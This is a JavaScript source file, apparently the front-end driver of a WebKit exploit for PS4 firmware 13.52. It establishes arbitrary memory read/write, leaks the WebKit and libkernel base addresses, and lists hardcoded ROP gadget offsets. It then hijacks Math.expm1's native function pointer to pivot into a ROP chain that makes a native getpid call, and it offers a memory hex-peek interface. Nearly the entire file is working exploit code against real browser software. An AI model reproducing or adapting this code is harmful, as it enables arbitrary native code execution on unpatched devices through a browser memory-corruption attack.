import { int64 } from "./int64.js";
import { offsetsFor, offsetsForKey } from "./ps4_offsets_userland.js";
import { installWindowP, pairStatus } from "./mem.js";
import { groomBootLine, wireGroomBar } from "./groom_presets.js";

const params = new URLSearchParams(location.search);
const BUILD_ID = "rw-20250827f";
/** promote real pair after primitive — frees ~96MB 12M carrier (chain_poops ?pair=1) */
const PROMOTE_PAIR = params.get("promote") !== "0";
const SWEEP_CYCLES = params.has("sweep")
    ? parseInt(params.get("sweep"), 10) : (PROMOTE_PAIR ? 4 : 0);
const SWEEP_MB = params.has("sweepmb") ? parseInt(params.get("sweepmb"), 10) : 4;
const SWEEP_MS = params.has("sweepms") ? parseInt(params.get("sweepms"), 10) : 100;
/** Skip heavy pointer map on Start unless ?rwproof=1 (saves memory for native call) */
const SKIP_RW_PROOF = params.get("rwproof") !== "1";
/** lite Start runs getpid inline unless ?native=0 */
const AUTO_NATIVE = SKIP_RW_PROOF && params.get("native") !== "0";
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const SYS_GETPID = 20;
const HW_GADGETS_1352 = {
    wk_POP_RDI_RET: 0x4be55,
    wk_POP_RSI_RET: 0x7acb3,
    wk_POP_RDX_RET: 0x30b1e9,
    wk_POP_RCX_RET: 0xeaf246,
    wk_POP_RAX_RET: 0x3424a,
    wk_POP_R8_RET:  0x5d185,
    wk_POP_R9_RET:  0x9b288b,
    wk_LEAVE_RET:   0xf195b,
    wk_expm1_builtin: 0xeb6350,
};

const lines = [];
const retained = [];
const pointers = [];
let busy = false;
let ready = false;
let exploit = null;
let raceAttempt = 0;
let lengthMissStreak = 0;

const LOG_MAX = 300;
const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;

let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
let btnStart, btnRefresh, btnNative, btnPeek, btnClear;
let nativeChain = null;
let trimDebrisFn = null;
let nativeAllowed = false;

function $(id) { return document.getElementById(id); }

function mark(tag, detail) {
    const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
    lines.push(line);
    if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
    if (outEl) {
        outEl.textContent = lines.join("\n");
        outEl.scrollTop = outEl.scrollHeight;
    }
}

function state(msg, cls) {
    if (!stateEl) return;
    stateEl.textContent = msg;
    stateEl.className = cls || "";
}

function setUi() {
    if (btnStart) btnStart.disabled = busy || ready;
    if (btnRefresh) btnRefresh.disabled = busy || !ready;
    if (btnNative) btnNative.disabled = busy || !ready || !nativeAllowed;
    if (btnPeek) btnPeek.disabled = busy || !ready;
    if (pickPtr) pickPtr.disabled = busy || !ready;
    if (addrIn) addrIn.disabled = busy || !ready;
}

function parseAddr(str) {
    if (!str) return null;
    const s = String(str).trim().toLowerCase().replace(/^0x/, "");
    if (!/^[0-9a-f]+$/.test(s)) return null;
    if (s.length <= 8) return new int64(parseInt(s, 16), 0);
    return new int64(parseInt(s.slice(-8), 16), parseInt(s.slice(0, -8), 16));
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function same64(a, b) {
    return a && b && a.low === b.low && a.hi === b.hi;
}

function addPtr(label, addr, note) {
    if (!addr) return;
    const row = { label, addr: String(addr), note: note || "" };
    pointers.push(row);
    mark("ADDR", row.label + "  " + row.addr + (row.note ? "  (" + row.note + ")" : ""));
}

function walkCell(p, label, obj) {
    retained.push(obj);
    const cell = p.leakval(obj);
    addPtr(label + " cell", cell, "leakval");
    const hdr = read8p(p, cell);
    if (hdr) mark("HDR", label + " header=" + hdr);
    for (const [off, tag] of [[0x8, "butterfly"], [0x10, "+0x10"], [0x18, "+0x18"]]) {
        const q = read8p(p, cell.add32(off));
        if (q && q.low !== 0) addPtr(label + " " + tag, q, "cell+0x" + off.toString(16));
    }
    return cell;
}

function captureNativeChain(p, mFunctionOff, off) {
    const cell = walkCell(p, "Math.expm1", Math.expm1);
    const mid = read8p(p, cell.add32(0x18));
    if (!mid) return null;
    addPtr("JSFunction (expm1)", mid, "cell+0x18");
    const nativeFn = read8p(p, mid.add32(mFunctionOff));
    if (nativeFn) {
        addPtr("native code ptr", nativeFn, "m_function / webkit .text");
        try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
        const q0 = read4p(p, nativeFn);
        if (q0 != null) mark("CODE", "nativeFn first4=0x" + (q0 >>> 0).toString(16));
        if (off && off.wk_expm1_builtin) {
            const n = (nativeFn.hi * 0x100000000 + (nativeFn.low >>> 0))
                - (off.wk_expm1_builtin >>> 0);
            const webkitBase = new int64(n >>> 0, Math.floor(n / 0x100000000));
            addPtr("webkitBase (assumed)", webkitBase,
                "nativeFn - 0x" + off.wk_expm1_builtin.toString(16));
            try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
        }
    }
    return nativeFn;
}

function addPairStatusPtrs() {
    const ps = pairStatus;
    const fields = [
        ["mainAddress", "carrier mainView"],
        ["mainVector", "main vector"],
        ["mainCellFromFakeSlot", "main from fake slot"],
        ["workerAddress", "carrier workerView"],
        ["workerVector", "worker vector"],
        ["workerButterfly", "worker butterfly"],
        ["fakeAddress", "fake cell"],
        ["fakeButterfly", "fake butterfly"],
    ];
    for (const [key, label] of fields) {
        const v = ps[key];
        if (v != null && v !== -1) addPtr(label, v, "pair/exploit");
    }
    mark("PAIR", "state=" + ps.state + " promoted=" + ps.promoted
        + " vectorOff=0x" + (ps.vectorOffset >>> 0).toString(16));
}

function renderMap() {
    if (!mapBody) return;
    if (pointers.length === 0) {
        mapBody.innerHTML = "<tr><td colspan=\"3\">no pointers</td></tr>";
        return;
    }
    mapBody.innerHTML = pointers.map((row, i) =>
        "<tr><td>" + row.label + "</td>"
        + "<td class=\"addr\" data-i=\"" + i + "\">" + row.addr + "</td>"
        + "<td>" + row.note + "</td></tr>"
    ).join("");
    mapBody.querySelectorAll(".addr").forEach(el => {
        el.addEventListener("click", () => {
            const row = pointers[+el.getAttribute("data-i")];
            if (row && addrIn) addrIn.value = row.addr.replace(/^0x/i, "");
            peekAt(parseAddr(row.addr.replace(/^0x/i, "")));
        });
    });

    if (pickPtr) {
        const cur = pickPtr.value;
        pickPtr.innerHTML = "<option value=\"\">pick known ptr…</option>"
            + pointers.map((row, i) =>
                "<option value=\"" + i + "\">" + row.label + " " + row.addr + "</option>"
            ).join("");
        if (cur) pickPtr.value = cur;
    }
}

function hexLine(addr, bytes) {
    const a = addr.low.toString(16).padStart(8, "0");
    const h = [...bytes].map(b => b.toString(16).padStart(2, "0")).join(" ");
    return a + "  " + h;
}

function read1p(p, addr) {
    try { return p.read1(addr); } catch (_) { return null; }
}

function peekAt(addr) {
    const p = window.p;
    if (!p || !addr) {
        if (hexEl) hexEl.textContent = "bad address";
        return;
    }
    const out = [];
    let cur = addr;
    for (let row = 0; row < 8; row++) {
        const chunk = [];
        for (let i = 0; i < 8; i++) {
            const b = read1p(p, cur.add32(i));
            if (b == null) {
                if (hexEl) hexEl.textContent = out.join("\n") + "\n(read failed @ " + cur + ")";
                return;
            }
            chunk.push(b & 0xff);
        }
        out.push(hexLine(cur, chunk));
        cur = cur.add32(8);
    }
    if (hexEl) hexEl.textContent = out.join("\n");
    mark("PEEK", String(addr));
}

function loadEffectiveOff() {
    const detected = offsetsFor(navigator.userAgent);
    const key = detected.key || "13.52";
    let off = Object.assign({}, offsetsForKey(key).off || {});
    try {
        const cal = sessionStorage.getItem("wk-calibrated");
        if (cal) off = Object.assign(off, JSON.parse(cal));
    } catch (_) { }
    return Object.assign(off, HW_GADGETS_1352);
}

function captureNativeFnQuick(p, off) {
    try {
        const raw = sessionStorage.getItem("wk-nativeFn");
        if (raw) {
            const fn = parseAddr(String(raw).replace(/^0x/i, ""));
            if (fn) return fn;
        }
    } catch (_) { }
    const cell = p.leakval(Math.expm1);
    return p.read8(p.read8(cell.add32(0x18))
        .add32(off.wk_JSFunction_m_function || 0x28));
}

function resolveLibkernelBase(p, off, webkitBase) {
    try {
        const raw = sessionStorage.getItem("wk-libkernelBase");
        if (raw) {
            const b = parseAddr(String(raw).replace(/^0x/i, ""));
            if (b) return b;
        }
    } catch (_) { }
    const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    return errorFn.sub32(off.k__error);
}

function putDv(dv, at, v) {
    if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
    }
}

function abBacking(p, off, ab) {
    const c = p.leakval(ab);
    return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
        .add32(off.wk_ArrayBuffer_m_contents_m_data));
}

/** Inline poops pivot — no dynamic import (import was OOMing on PS4) */
function armNativePivot(p, off, webkitBase, libkernelBase) {
    const mfn = off.wk_JSFunction_m_function || 0x28;
    const pivotSp = off.pivot_view_sp != null ? off.pivot_view_sp : 0x38;
    const pbSize = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
    const stubOff = off.k_stubs && off.k_stubs[SYS_GETPID];
    if (stubOff == null) throw new Error("no getpid stub offset");

    const G = {
        POP_RDI: webkitBase.add32(off.wk_POP_RDI_RET),
        POP_RSI: webkitBase.add32(off.wk_POP_RSI_RET),
        POP_RDX: webkitBase.add32(off.wk_POP_RDX_RET),
        POP_RCX: webkitBase.add32(off.wk_POP_RCX_RET),
        POP_R8:  webkitBase.add32(off.wk_POP_R8_RET),
        POP_R9:  webkitBase.add32(off.wk_POP_R9_RET),
        POP_RAX: webkitBase.add32(off.wk_POP_RAX_RET),
        LEAVE:   webkitBase.add32(off.wk_LEAVE_RET),
        MOV_RDI_RAX: webkitBase.add32(off.wk_MOV_QWORD_PTR_RDI_RAX_RET),
        G0: webkitBase.add32(off.wk_MOV_RDI_RSI_30_CALL),
        G1: webkitBase.add32(off.wk_POP_RAX_MOV_RAX_JMP_18),
        G2: webkitBase.add32(off.wk_PUSH_RBP_MOV_RBP_RSP_10),
        G3: webkitBase.add32(off.wk_MOV_RDI_RAX_8_CALL_20),
        G4: webkitBase.add32(off.wk_MOV_RDX_RAX_18_CALL_10),
        G5: webkitBase.add32(off.wk_PUSH_RDX_POP_RSP_RET),
    };
    const getpidStub = libkernelBase.add32(stubOff);
    const argGadget = [G.POP_RDI, G.POP_RSI, G.POP_RDX, G.POP_RCX, G.POP_R8, G.POP_R9];

    const sb = new ArrayBuffer(0x20);
    const pb = new ArrayBuffer(pbSize);
    const kb = new ArrayBuffer(0x2000);
    const fb = new ArrayBuffer(0x40);
    const storeDv = new DataView(sb);
    const pivotDv = new DataView(pb);
    const stackDv = new DataView(kb);
    const frameDv = new DataView(fb);
    const stackU8 = new Uint8Array(kb);
    const frameU8 = new Uint8Array(fb);

    const S = abBacking(p, off, sb);
    const P = abBacking(p, off, pb);
    const K = abBacking(p, off, kb);
    const F = abBacking(p, off, fb);

    putDv(storeDv, 0x00, G.G1);
    putDv(storeDv, 0x08, P);
    putDv(storeDv, 0x10, G.G3);
    putDv(storeDv, 0x18, G.G2);
    putDv(pivotDv, 0x00, P);
    putDv(pivotDv, 0x10, G.G5);
    putDv(pivotDv, 0x20, G.G4);

    function layoutCall(target, args) {
        stackU8.fill(0);
        frameU8.fill(0);
        const insts = [];
        const n = args ? args.length : 0;
        for (let i = 0; i < n; i++) {
            insts.push(argGadget[i]);
            insts.push(args[i]);
        }
        const targetIdx = insts.length;
        insts.push(target);
        insts.push(G.POP_RDI);
        insts.push(F);
        insts.push(G.MOV_RDI_RAX);
        insts.push(G.POP_RAX);
        insts.push(JSVALUE_UNDEFINED);
        insts.push(G.LEAVE);
        let at = 0x2000 - 8 * insts.length;
        if (((K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
        for (let i = 0; i < insts.length; i++)
            putDv(stackDv, at + 8 * i, insts[i]);
        putDv(pivotDv, pivotSp, K.add32(at));
    }

    const expm1Cell = p.leakval(Math.expm1);
    const mainMf = p.read8(p.read8(expm1Cell.add32(0x18)).add32(mfn));
    const mainOrig = p.read8(mainMf);
    const pivotObj = {};
    const pivotCell = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);

    return {
        libkernelBase,
        getpid() {
            layoutCall(getpidStub, []);
            const saved = p.read8(pivotCell);
            p.write8(pivotCell, S);
            Math.expm1(pivotObj);
            p.write8(pivotCell, saved);
            return frameDv.getUint32(0, true) | 0;
        },
        disarm() {
            try { p.write8(mainMf, mainOrig); } catch (_) { }
        },
    };
}

function stripUiForNative() {
    for (const id of ["groom-bar", "peek-bar", "hint", "map"]) {
        const el = document.getElementById(id);
        if (el) el.style.display = "none";
    }
    const mapTable = document.getElementById("map");
    if (mapTable && mapTable.previousElementSibling)
        mapTable.previousElementSibling.style.display = "none";
    const hexTitle = document.getElementById("hex");
    if (hexTitle && hexTitle.previousElementSibling)
        hexTitle.previousElementSibling.style.display = "none";
}

function resolveWebkitBase(off, nativeFn) {
    try {
        const raw = sessionStorage.getItem("wk-webkitBase");
        if (raw) {
            const b = parseAddr(String(raw).replace(/^0x/i, ""));
            if (b) return b;
        }
    } catch (_) { }
    if (nativeFn && off.wk_expm1_builtin)
        return nativeFn.sub32(off.wk_expm1_builtin);
    return null;
}

async function sweepAfterPromote() {
    if (!PROMOTE_PAIR || !pairStatus.promoted || SWEEP_CYCLES <= 0) {
        mark("SWEEP-SKIP", "promoted=" + pairStatus.promoted
            + " cycles=" + SWEEP_CYCLES);
        return;
    }
    mark("SWEEP", "cycles=" + SWEEP_CYCLES + " mb=" + SWEEP_MB
        + " floor_ms=" + SWEEP_MS);
    state("sweeping carrier debris…", "warn");
    const t0 = Date.now();
    let worst = 0;
    for (let i = 0; i < SWEEP_CYCLES; i++) {
        const c0 = Date.now();
        let junk = [];
        for (let k = 0; k < SWEEP_MB; k++)
            junk.push(new ArrayBuffer(0x100000));
        junk.length = 0;
        junk = null;
        await new Promise(r => setTimeout(r, SWEEP_MS));
        const dt = Date.now() - c0;
        if (dt > worst) worst = dt;
    }
    mark("SWEEP-DONE", "worst_ms=" + worst + " total_ms=" + (Date.now() - t0));
}

async function freeAfterPrimitive() {
    retained.length = 0;
    if (lines.length > 4) {
        lines.splice(0, lines.length - 4);
        if (outEl) outEl.textContent = lines.join("\n");
    }
    try {
        if (!exploit) {
            const core = await import("./core.js");
            exploit = {
                establishPrimitive: core.establishPrimitive,
                installWindowP,
                trimExploitDebris: core.trimExploitDebris,
            };
        }
        if (exploit.trimExploitDebris)
            exploit.trimExploitDebris();
    } catch (_) { }
    await new Promise(r => setTimeout(r, 128));
}

async function freeBeforeNative() {
    stripUiForNative();
    retained.length = 0;
    pointers.length = 0;
    lines.length = 0;
    if (outEl) outEl.textContent = "";
    if (trimDebrisFn) {
        try { trimDebrisFn(); } catch (_) { }
    }
    exploit = null;
    await new Promise(r => setTimeout(r, 500));
}

function seedNativeSession(p, off) {
    const fn = captureNativeFnQuick(p, off);
    if (fn) {
        try { sessionStorage.setItem("wk-nativeFn", String(fn)); } catch (_) { }
        const base = resolveWebkitBase(off, fn);
        if (base) try { sessionStorage.setItem("wk-webkitBase", String(base)); } catch (_) { }
    }
    return fn;
}

async function doNativeCall(fromStart) {
    if (!nativeAllowed) {
        mark("NATIVE-FAIL", "pair not promoted — close browser, reload, Start");
        state("promote failed — native blocked", "bad");
        return;
    }
    const p = window.p;
    if (!p) throw new Error("window.p missing");
    if (!fromStart) await freeBeforeNative();

    const off = loadEffectiveOff();
    const nativeFn = captureNativeFnQuick(p, off);
    const webkitBase = resolveWebkitBase(off, nativeFn);
    if (!webkitBase) {
        mark("NATIVE-FAIL", "no webkitBase — run index_cal Accept first");
        state("need cal base", "bad");
        return;
    }
    const libkernelBase = resolveLibkernelBase(p, off, webkitBase);
    if (nativeChain) {
        nativeChain.disarm();
        nativeChain = null;
    }
    mark("NATIVE-SETUP", "base=" + webkitBase + " lk=" + libkernelBase);
    const chain = armNativePivot(p, off, webkitBase, libkernelBase);
    nativeChain = chain;
    try {
        sessionStorage.setItem("wk-libkernelBase", String(libkernelBase));
    } catch (_) { }
    mark("NATIVE-CALL", "getpid… build=" + BUILD_ID);
    const pid = chain.getpid();
    if (pid > 0) {
        mark("NATIVE-OK", "getpid=" + pid);
        state("native call OK pid=" + pid, "ok");
    } else {
        mark("NATIVE-FAIL", "getpid=" + pid);
        state("getpid returned <=0", "bad");
    }
}

async function runNativeCall() {
    if (busy || !ready || !window.p) return;
    busy = true;
    setUi();
    try {
        await doNativeCall();
    } catch (err) {
        if (nativeChain) {
            try { nativeChain.disarm(); } catch (_) { }
            nativeChain = null;
        }
        mark("NATIVE-FAIL", err.message || String(err));
        state("native call failed", "bad");
    } finally {
        busy = false;
        setUi();
    }
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "core.js + mem.js");
    const core = await import("./core.js");
    trimDebrisFn = core.trimExploitDebris;
    exploit = {
        establishPrimitive: core.establishPrimitive,
        installWindowP,
        trimExploitDebris: core.trimExploitDebris,
    };
    return exploit;
}

function attemptCap() {
    if (!params.has("attempts")) return 0;
    const n = parseInt(params.get("attempts"), 10);
    return n > 0 ? n : 0;
}

function onRaceEvent(tag, detail) {
    if (!CORE_LOG.test(tag)) return;
    mark(tag, detail || "");

    if (tag === "ATTEMPT-START") {
        raceAttempt++;
        state("race attempt " + raceAttempt + "…", "warn");
        if (raceAttempt === 15 || raceAttempt === 30 || raceAttempt === 50)
            mark("HINT-GROOM", "still missing? close browser fully → reload → tap 512 or max groom");
    }

    if (/COMPOSITION-LENGTH-MISS|SSV-PLACEMENT-MISS|ZERO-HEADER-MISS/.test(tag)) {
        lengthMissStreak++;
        if (lengthMissStreak === 8 || lengthMissStreak === 20)
            mark("HINT-GROOM", "COMPOSITION-LENGTH-MISS = race lost — tap 512 drain or max groom, close browser, reload");
    }

    if (tag === "READ-PRIMITIVE-PASS" || tag === "PRIMITIVE-OK")
        lengthMissStreak = 0;
}

async function establishOnce(establishPrimitive) {
    raceAttempt = 0;
    lengthMissStreak = 0;
    const cap = attemptCap();
    mark("ATTEMPTS", cap > 0 ? String(cap) + " per page load" : "unlimited (single run)");
    mark("NOTE", "close browser fully before Start if prior OOM or long retry session");

    return establishPrimitive({
        maxAttempts: cap,
        onEvent: (t, d, a) => onRaceEvent(t, (a != null ? "[" + a + "] " : "") + (d || ""))
    });
}

function bufAddr(p, off, ab) {
    const cell = walkCell(p, "ArrayBuffer", ab);
    const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
    if (!impl) return null;
    addPtr("ArrayBuffer impl", impl, "+0x" + off.wk_ArrayBuffer_m_impl.toString(16));
    const data = read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
    if (data) addPtr("ArrayBuffer backing", data, "m_contents.m_data");
    return data;
}

async function runRwProof(p, off) {
    const boxA = { tag: "demoA", n: 1 };
    const boxB = { tag: "demoB", n: 2 };
    walkCell(p, "JSObject A", boxA);
    walkCell(p, "JSObject B", boxB);

    const rowA = pointers.filter(x => x.label === "JSObject A cell").pop();
    const rowB = pointers.filter(x => x.label === "JSObject B cell").pop();
    const addrA = rowA ? parseAddr(String(rowA.addr).replace(/^0x/i, "")) : null;
    const addrB = rowB ? parseAddr(String(rowB.addr).replace(/^0x/i, "")) : null;

    const okLeak = addrA && addrB && !same64(addrA, addrB) && addrA.low !== 0;
    mark(okLeak ? "PASS" : "FAIL", "leakval-distinct  a=" + addrA + " b=" + addrB);

    const headerA = okLeak ? p.read8(addrA) : null;
    if (headerA) {
        p.write8(addrA, headerA);
    }
    const okHdr = headerA && same64(p.read8(addrA), headerA);
    mark(okHdr ? "PASS" : "FAIL", "read8-write8 header roundtrip");

    const probe = new ArrayBuffer(0x20);
    retained.push(probe);
    const view = new Uint32Array(probe);
    view[0] = 0xcafebabe;

    if (off) {
        const dataPtr = bufAddr(p, off, probe);
        if (!dataPtr) {
            mark("FAIL", "arraybuffer backing chain");
        } else {
            const got = read4p(p, dataPtr);
            const okR = got === 0xcafebabe;
            mark(okR ? "PASS" : "FAIL", "arraybuffer-read4  got=0x"
                + (got == null ? "null" : got.toString(16)));
            if (okR) {
                p.write4(dataPtr, new int64(0x600dbabe, 0));
                mark(view[0] === 0x600dbabe ? "PASS" : "FAIL", "arraybuffer-write4");
            }
        }
        captureNativeChain(p, off.wk_JSFunction_m_function || 0x28, off);
    }

    try { walkCell(p, "parseFloat", parseFloat); } catch (_) { }
    try { walkCell(p, "Object proto", Object); } catch (_) { }

    addPairStatusPtrs();
    renderMap();
    mark("ADDR-LIST", pointers.length + " pointers logged above");

    return okLeak && okHdr;
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    setUi();
    lines.length = 0;
    pointers.length = 0;
    renderMap();

    const detected = offsetsFor(navigator.userAgent);
    mark("UA-FW", detected.key || "unknown");
    mark("SCOPE", "WebKit browser process — not full OS process list");
    state("getting primitive…", "warn");

    try {
        const { establishPrimitive, installWindowP: installP } = await loadExploit();
        let carrier;
        try {
            carrier = await establishOnce(establishPrimitive);
        } catch (err) {
            if (/gave up/i.test(String(err.message))) {
                mark("HINT-GROOM", "race lost — close browser fully, reload, tap 512 or max groom, Start again");
            }
            throw err;
        }

        installP(carrier, {
            promote: PROMOTE_PAIR,
            onEvent: (t, d) => {
                if (/PAIR|TRIM|RELEASE|SWEEP|FAIL|ERROR/i.test(t))
                    mark(t, d || "");
            },
        });
        const p = window.p;
        if (!p) throw new Error("window.p missing");

        mark("PRIMITIVE-OK", "arb rw live");
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted);

        await freeAfterPrimitive();
        await sweepAfterPromote();

        nativeAllowed = !!pairStatus.promoted;
        if (PROMOTE_PAIR && !pairStatus.promoted) {
            mark("PROMOTE-FAIL", pairStatus.error || pairStatus.state || "unknown");
        }

        const off = loadEffectiveOff();
        if (SKIP_RW_PROOF) {
            if (!AUTO_NATIVE) seedNativeSession(p, off);
            mark("START-LITE", "rw proof skipped"
                + (AUTO_NATIVE ? " — auto native" : " (add ?native=0 to defer)"));
            ready = true;
            if (nativeAllowed && AUTO_NATIVE) {
                state("calling getpid…", "warn");
                try { await doNativeCall(true); }
                catch (err) {
                    if (nativeChain) {
                        try { nativeChain.disarm(); } catch (_) { }
                        nativeChain = null;
                    }
                    mark("NATIVE-FAIL", err.message || String(err));
                    state("native call failed", "bad");
                }
            } else if (!nativeAllowed) {
                state("promote failed — native blocked", "bad");
            } else {
                state("primitive OK — tap Native call", "ok");
            }
        } else {
            seedNativeSession(p, off);
            nativeAllowed = !!pairStatus.promoted;
            const ok = await runRwProof(p, off);
            ready = true;
            if (ok) {
                state("RW-ONLY-OK — tap addresses or peek", "ok");
                mark("RW-ONLY-OK", pointers.length + " pointers mapped");
            } else {
                state("primitive OK — some rw checks failed", "warn");
            }
        }
    } catch (err) {
        state("failed: " + err.message, "bad");
        mark("ERROR", err.stack || err.message);
    } finally {
        busy = false;
        setUi();
    }
}

function refreshMap() {
    if (!ready || !window.p) return;
    pointers.length = 0;
    const off = loadEffectiveOff();
    runRwProof(window.p, off);
    mark("REFRESH", pointers.length + " pointers");
}

function reportErr(err) {
    const msg = err && err.message ? err.message : String(err);
    state("error: " + msg, "bad");
    mark("ERROR", err && err.stack ? err.stack : msg);
}

function wireClick(el, fn) {
    if (!el) return;
    el.addEventListener("click", function () {
        try {
            const r = fn();
            if (r && typeof r.then === "function")
                r.catch(reportErr);
        } catch (err) {
            reportErr(err);
        }
    });
}

function init() {
    outEl = $("out");
    stateEl = $("state");
    mapBody = $("map-body");
    hexEl = $("hex");
    pickPtr = $("pick-ptr");
    addrIn = $("addr-in");
    btnStart = $("btn-start");
    btnRefresh = $("btn-refresh");
    btnNative = $("btn-native");
    btnPeek = $("btn-peek");
    btnClear = $("btn-clear");

    if (!outEl || !btnStart) {
        state("UI missing — open via HTTP(S), not file://", "bad");
        return;
    }

    wireClick(btnStart, function () { return runStart(); });
    wireClick(btnRefresh, refreshMap);
    wireClick(btnNative, function () { return runNativeCall(); });
    wireClick(btnClear, function () {
        lines.length = 0;
        if (outEl) outEl.textContent = "";
    });
    wireClick(btnPeek, function () {
        const a = parseAddr(addrIn.value);
        if (!a) { mark("PEEK-FAIL", "bad hex"); return; }
        peekAt(a);
    });

    if (pickPtr) {
        pickPtr.addEventListener("change", function () {
            const i = parseInt(pickPtr.value, 10);
            if (!(i >= 0) || !pointers[i]) return;
            addrIn.value = pointers[i].addr.replace(/^0x/i, "");
        });
    }

    mark("BOOT", "build=" + BUILD_ID + " — inline native pivot (no import)");
    mark("BOOT", "auto-native=" + AUTO_NATIVE + " promote=" + PROMOTE_PAIR);
    mark("BOOT", groomBootLine(params));
    mark("BOOT", "one establishPrimitive run — internal auto-retry until win");
    window.addEventListener("beforeunload", function () {
        if (nativeChain) try { nativeChain.disarm(); } catch (_) { }
    });
    wireGroomBar(() => busy);
    setUi();
    state("ready — pick groom if needed, then Start", "");
}

function bootUi() {
    try {
        init();
    } catch (err) {
        reportErr(err);
    }
}

if (document.readyState === "loading")
    document.addEventListener("DOMContentLoaded", bootUi);
else
    bootUi();
